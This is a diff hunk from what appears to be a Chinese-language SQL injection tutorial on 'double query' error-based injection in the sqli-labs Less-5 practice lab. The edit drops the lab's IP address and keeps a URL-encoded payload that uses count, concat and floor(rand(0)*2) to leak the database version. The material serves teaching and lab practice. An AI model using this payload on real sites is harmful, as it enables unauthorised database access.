@@ -719,7 +719,7 @@ Double query injection
 
 先来看看Less5中的案例：
 
-http://192.168.1.103/sqli-labs/Less-5/?id=0%27%20and%20(select%201%20from%20(select%20count(*),%20concat((select%20version()),floor(rand(0)*2))a%20from%20information_schema.tables%20group%20by%20a)x)%23
+?id=0%27%20and%20(select%201%20from%20(select%20count(*),%20concat((select%20version()),floor(rand(0)*2))a%20from%20information_schema.tables%20group%20by%20a)x)%23
 
 如果我们把数据字段写成一个不存在的数据，并且用and链接，
 
